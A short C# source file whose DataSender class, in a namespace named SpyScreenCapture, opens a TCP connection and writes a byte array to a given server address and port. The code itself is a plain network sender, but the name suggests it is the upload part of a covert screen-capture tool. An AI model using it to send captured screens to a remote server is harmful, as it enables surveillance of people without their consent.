using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace SpyScreenCapture
{
    public static class DataSender
    {
        public static async void SendDataToServer(string serverAddress, int port, Byte[] dataToTransfer)
        {
			try
			{
				using (var client = new TcpClient(serverAddress, port))
				{
					using (var stream = client.GetStream())
					{
						await stream.WriteAsync(dataToTransfer, 0, dataToTransfer.Length);
                        await stream.FlushAsync();
                        Debug.WriteLine("Debug Message : Data transfer Completed.");
                    }
				}
			}
			catch (Exception)
			{

				throw;
			}
        }
    }
}
